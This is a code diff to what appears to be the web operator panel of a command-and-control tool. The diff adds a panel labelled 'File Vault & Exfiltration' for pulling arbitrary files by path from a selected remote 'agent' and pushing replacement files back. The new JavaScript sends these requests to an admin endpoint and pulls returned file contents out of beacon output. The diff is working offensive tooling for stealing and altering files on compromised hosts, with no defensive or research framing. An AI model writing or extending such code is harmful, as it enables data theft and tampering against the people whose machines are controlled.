@@ -142,6 +142,18 @@
             color: #ffffff;
             background: rgba(255,255,255,.08);
         }
+
+        .file-editor {
+            background: #080809;
+            color: var(--success);
+            border: 1px solid var(--line);
+            font-family: 'Consolas', monospace;
+            width: 100%;
+            height: 300px;
+            outline: none;
+            padding: 10px;
+            border-radius: 4px;
+        }
     </style>
 </head>
 <body>
@@ -244,6 +256,22 @@
         </div>
         <div id="results-feed" class="terminal" style="max-height:500px"></div>
     </div>
+
+    <div class="panel mt-3">
+        <div class="d-flex justify-content-between align-items-center mb-2">
+            <strong>File Vault & Exfiltration</strong>
+            <div class="d-flex gap-2">
+                <input type="text" id="vault-path" class="form-control form-control-sm" placeholder="Full path (e.g. /etc/hosts)" style="width: 300px;">
+                <button class="btn btn-sm btn-outline-custom" onclick="vaultOp('pull')">Pull File</button>
+                <button class="btn btn-sm btn-light" onclick="vaultOp('push')">Push & Replace</button>
+            </div>
+        </div>
+        <div class="row g-2">
+            <div class="col-md-12">
+                <textarea id="vault-editor" class="file-editor" placeholder="File content will appear here after a successful Pull..."></textarea>
+            </div>
+        </div>
+    </div>
 </div>
 
 <script>
@@ -306,6 +334,46 @@
     async function purgeQueue() {
         await fetch('/admin/purge_tasks', { method: 'POST' });
         updateDashboard();
+    }
+
+    async function vaultOp(op) {
+        const host = document.getElementById('target-select').value;
+        const path = document.getElementById('vault-path').value;
+        const content = document.getElementById('vault-editor').value;
+
+        if (host === "ALL" || !path) {
+            alert("Select a specific agent and provide a file path.");
+            return;
+        }
+
+        const body = new FormData();
+        body.append('hostname', host);
+        body.append('path', path);
+        body.append('op', op);
+        if (op === 'push') body.append('content', content);
+
+        const res = await fetch('/admin/file_op', { method: 'POST', body });
+        if (res.ok) {
+            const msg = op === 'pull' ? "Pull command transmitted. Await beacon." : "Replacement file transmitted.";
+            alert(msg);
+        }
+    }
+
+    // Update your renderResults function to automatically catch file pulls
+    // This logic looks for the specific FILE_PULL output and puts it in the editor
+    function renderResults(results) {
+        const el = document.getElementById('results-feed');
+        const editor = document.getElementById('vault-editor');
+        // ... existing no-results check ...
+        el.innerHTML = '';
+        results.forEach(r => {
+            // Auto-detect if this output is a file content we just pulled
+            if (r.output.includes("FILE_DATA_START")) {
+                const cleanContent = r.output.split("FILE_DATA_START")[1].split("FILE_DATA_END")[0];
+                editor.value = cleanContent.trim();
+            }
+            el.innerHTML += `<div class="item">...</div>`; // existing render logic
+        });
     }
 
     function syncHostFilter(hosts) {
